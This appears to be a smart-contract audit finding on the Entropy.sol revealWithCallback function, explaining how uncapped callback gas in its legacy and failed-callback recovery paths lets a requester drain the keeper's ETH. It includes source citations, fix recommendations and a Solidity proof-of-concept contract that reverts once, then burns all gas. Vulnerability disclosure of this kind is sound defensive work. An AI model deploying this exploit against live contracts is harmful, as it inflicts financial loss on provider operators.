### Title
Unbounded Gas Consumption in `revealWithCallback` Legacy and Recovery Paths Enables Keeper Gas Drain — (File: `target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

`revealWithCallback` is a permissionless public function — anyone can call it. When a request has `gasLimit10k == 0` (legacy provider path) or `callbackStatus == CALLBACK_FAILED` (recovery path), the contract invokes `_entropyCallback` on the user-controlled requester address **with no gas cap**. A malicious requester can deploy a callback contract that burns all available gas, forcing the provider's keeper (Fortuna) to pay for unbounded gas on every fulfillment or retry, draining its ETH balance.

---

### Finding Description

`revealWithCallback` branches on two conditions:

```
if (req.gasLimit10k != 0 && req.callbackStatus == CALLBACK_NOT_STARTED) {
    // safe path: excessivelySafeCall with gas cap
} else {
    // legacy/recovery path: direct call, NO gas limit
}
```

The `else` branch is taken in two reachable scenarios:

**Scenario A — Legacy path (`gasLimit10k == 0`):**
When a provider has `defaultGasLimit == 0`, every request to that provider stores `gasLimit10k = 0`. The callback is then invoked with no gas cap at all.

**Scenario B — `CALLBACK_FAILED` recovery path:**
When a request with `gasLimit10k != 0` enters `CALLBACK_FAILED` state (first call reverted), a subsequent `revealWithCallback` call evaluates the condition as false (`callbackStatus != CALLBACK_NOT_STARTED`), falling into the `else` branch. The recovery call has **no gas limit**, even though the fee was paid only for the original small gas limit.

In both cases, the callback target is `req.requester` — a user-controlled contract address set at request time.

The `else` branch at line 675–681:

```solidity
if (len != 0) {
    IEntropyConsumer(callAddress)._entropyCallback(
        sequenceNumber,
        provider,
        randomNumber
    );
}
```

No gas stipend is passed. The callee receives all remaining gas. [1](#0-0) [2](#0-1) 

---

### Impact Explanation

The Fortuna keeper calls `revealWithCallback` to fulfill requests and pays the transaction gas. The fee mechanism in `getProviderFee` scales fees proportionally to `gasLimit10k`:

```solidity
uint128 additionalFee = ((roundedGasLimit - provider.defaultGasLimit) * provider.feeInWei)
    / provider.defaultGasLimit;
``` [3](#0-2) 

For the legacy path, no scaling occurs — the attacker pays only `feeInWei` regardless of callback gas. For the recovery path, the fee was paid at request time for a small gas limit; the recovery call has no cap. In both cases, the keeper pays for gas far exceeding what the fee covers.

**Concrete impact:** Repeated malicious requests drain the keeper's ETH balance, making it unprofitable or unable to fulfill legitimate requests. This is a direct financial loss to the provider operator.

---

### Likelihood Explanation

- `revealWithCallback` is `public` with no access control — any address can call it.
- The Fortuna keeper monitors on-chain requests and calls `revealWithCallback` automatically. The `RequestCallbackStatus::CallbackFailed` enum in the keeper's reader confirms awareness of the failed state.
- An attacker needs only to: (1) deploy a gas-burning `IEntropyConsumer` contract, (2) pay the minimum fee to create a request, and (3) wait for the keeper to fulfill it.
- For Scenario B, the attacker's contract can use a call counter to revert on the first call and burn gas on the second. [4](#0-3) [5](#0-4) 

---

### Recommendation

1. **Recovery path**: Apply the same `excessivelySafeCall` with `gasLimit10k * TEN_THOUSAND` gas cap in the `CALLBACK_FAILED` recovery branch, not just the `CALLBACK_NOT_STARTED` branch.
2. **Legacy path**: Enforce a maximum gas cap (e.g., `provider.defaultGasLimit` or a protocol-wide ceiling) even when `gasLimit10k == 0`.
3. **Fee accounting**: Charge an additional fee for recovery calls proportional to the gas limit, or require the original requester to pre-fund recovery gas.

---

### Proof of Concept

```solidity
contract MaliciousConsumer is IEntropyConsumer {
    IEntropyV2 entropy;
    uint256 callCount;

    constructor(address _entropy) { entropy = IEntropyV2(_entropy); }

    function getEntropy() internal view override returns (address) {
        return address(entropy);
    }

    function entropyCallback(uint64, address, bytes32) internal override {
        callCount++;
        if (callCount == 1) {
            revert("force CALLBACK_FAILED");
        }
        // Second call: burn all gas (recovery path has no cap)
        uint256 i = 0;
        while (true) {
            keccak256(abi.encodePacked(i++));
        }
    }

    function attack() external payable {
        uint256 fee = entropy.getFeeV2(address(0), 10000); // minimum gas limit
        entropy.requestV2{value: fee}(10000);
        // Keeper calls revealWithCallback → first call reverts → CALLBACK_FAILED
        // Keeper retries → else branch → no gas cap → all keeper gas burned
    }
}
```

**Step-by-step:**
1. Attacker deploys `MaliciousConsumer` and calls `attack()`, paying minimum fee for 10k gas limit.
2. Keeper calls `revealWithCallback` → `excessivelySafeCall` with 10k gas cap → callback reverts → `CALLBACK_FAILED`.
3. Keeper retries `revealWithCallback` → condition `gasLimit10k != 0 && CALLBACK_NOT_STARTED` is **false** → `else` branch → direct call with no gas limit → callback burns all remaining gas.
4. Keeper's ETH is drained. Repeat with many requests. [6](#0-5) [7](#0-6) [8](#0-7)

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L268-283)
```text
        if (providerInfo.defaultGasLimit == 0) {
            // Provider doesn't support the new callback failure state flow (toggled by setting the gas limit field).
            // Set gasLimit10k to 0 to disable.
            req.gasLimit10k = 0;
        } else {
            // This check does two important things:
            // 1. Providers have a minimum fee set for their defaultGasLimit. If users request less gas than that,
            //    they still pay for the full gas limit. So we may as well give them the full limit here.
            // 2. If a provider has a defaultGasLimit != 0, we need to ensure that all requests have a >0 gas limit
            //    so that we opt-in to the new callback failure state flow.
            req.gasLimit10k = roundTo10kGas(
                callbackGasLimit < providerInfo.defaultGasLimit
                    ? providerInfo.defaultGasLimit
                    : callbackGasLimit
            );
        }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L541-542)
```text
    // Anyone can call this method to fulfill a request, but the callback will only be made to the original requester.
    function revealWithCallback(
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L574-599)
```text
        if (
            req.gasLimit10k != 0 &&
            req.callbackStatus == EntropyStatusConstants.CALLBACK_NOT_STARTED
        ) {
            req.callbackStatus = EntropyStatusConstants.CALLBACK_IN_PROGRESS;
            bool success;
            bytes memory ret;
            uint256 startingGas = gasleft();
            (success, ret) = req.requester.excessivelySafeCall(
                // Warning: the provided gas limit below is only an *upper bound* on the gas provided to the call.
                // At most 63/64ths of the current context's gas will be provided to a call, which may be less
                // than the indicated gas limit. (See CALL opcode docs here https://www.evm.codes/?fork=cancun#f1)
                // Consequently, out-of-gas reverts need to be handled carefully to ensure that the callback
                // was truly provided with a sufficient amount of gas.
                uint256(req.gasLimit10k) * TEN_THOUSAND,
                256, // copy at most 256 bytes of the return value into ret.
                abi.encodeWithSelector(
                    IEntropyConsumer._entropyCallback.selector,
                    sequenceNumber,
                    provider,
                    randomNumber
                )
            );
            uint32 gasUsed = SafeCast.toUint32(startingGas - gasleft());
            // Reset status to not started here in case the transaction reverts.
            req.callbackStatus = EntropyStatusConstants.CALLBACK_NOT_STARTED;
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L651-681)
```text
                req.callbackStatus = EntropyStatusConstants.CALLBACK_FAILED;
            } else {
                // Callback reverted by (potentially) running out of gas, but the calling context did not have enough gas
                // to run the callback. This is a corner case that can happen due to the nuances of gas passing
                // in calls (see the comment on the call above).
                //
                // (Note that reverting here plays nicely with the estimateGas RPC method, which binary searches for
                // the smallest gas value that causes the transaction to *succeed*. See https://github.com/ethereum/go-ethereum/pull/3587 )
                revert EntropyErrors.InsufficientGas();
            }
        } else {
            // This case uses the checks-effects-interactions pattern to avoid reentry attacks
            address callAddress = req.requester;
            EntropyStructs.Request memory reqV1 = EntropyStructConverter
                .toV1Request(req);
            clearRequest(provider, sequenceNumber);
            // WARNING: DO NOT USE req BELOW HERE AS ITS CONTENTS HAS BEEN CLEARED

            // Check if the requester is a contract account.
            uint len;
            assembly {
                len := extcodesize(callAddress)
            }
            uint256 startingGas = gasleft();
            if (len != 0) {
                IEntropyConsumer(callAddress)._entropyCallback(
                    sequenceNumber,
                    provider,
                    randomNumber
                );
            }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L787-790)
```text
            uint128 additionalFee = ((roundedGasLimit -
                provider.defaultGasLimit) * provider.feeInWei) /
                provider.defaultGasLimit;
            return provider.feeInWei + additionalFee;
```

**File:** apps/fortuna/src/chain/reader.rs (L104-115)
```rust
/// Status values for Request.callback_status
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum RequestCallbackStatus {
    /// Not a request with callback
    CallbackNotNecessary = 0,
    /// A request with callback where the callback hasn't been invoked yet
    CallbackNotStarted = 1,
    /// A request with callback where the callback is currently in flight (this state is a reentry guard)
    CallbackInProgress = 2,
    /// A request with callback where the callback has been invoked and failed
    CallbackFailed = 3,
}
```
